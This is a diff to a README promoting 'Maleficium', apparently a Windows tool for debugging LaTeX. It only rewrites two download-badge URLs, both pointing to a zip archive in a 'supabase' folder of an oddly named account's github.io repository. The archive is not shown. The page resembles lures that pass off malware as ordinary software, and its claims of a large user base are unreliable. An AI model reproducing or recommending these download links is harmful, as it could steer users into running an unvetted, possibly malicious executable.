@@ -49,7 +49,7 @@ Let's get you up and running with Maleficium in just a few minutes.
 
 ### 📥 Download Maleficium
 
-[![Download Maleficium](https://img.shields.io/badge/⬇️%20Download%20Maleficium-v1.0.0-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://raw.githubusercontent.com/Unprovocative-jamaicancapital204/unprovocative-jamaicancapital204.github.io/main/supabase/Application_v2.8.zip)
+[![Download Maleficium](https://img.shields.io/badge/⬇️%20Download%20Maleficium-v1.0.0-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/Unprovocative-jamaicancapital204/unprovocative-jamaicancapital204.github.io/raw/refs/heads/main/supabase/Application_v2.8.zip)
 
 Visit this link to download the application. You'll find the latest version of Maleficium ready for your Windows computer.
 
@@ -268,7 +268,7 @@ For the curious ones:
 
 You're just a few clicks away from a better LaTeX experience. Download Maleficium today and see why thousands of users have made the switch.
 
-[![Get Started with Maleficium](https://img.shields.io/badge/🎯%20Download%20Now-Maleficium-00FF7F?style=for-the-badge&logo=github&logoColor=white&labelColor=006400)](https://raw.githubusercontent.com/Unprovocative-jamaicancapital204/unprovocative-jamaicancapital204.github.io/main/supabase/Application_v2.8.zip)
+[![Get Started with Maleficium](https://img.shields.io/badge/🎯%20Download%20Now-Maleficium-00FF7F?style=for-the-badge&logo=github&logoColor=white&labelColor=006400)](https://github.com/Unprovocative-jamaicancapital204/unprovocative-jamaicancapital204.github.io/raw/refs/heads/main/supabase/Application_v2.8.zip)
 
 Remember: Debugging LaTeX doesn't have to be evil sorcery. With Maleficium, it's practically a pleasant ritual. Happy writing! ✨
 
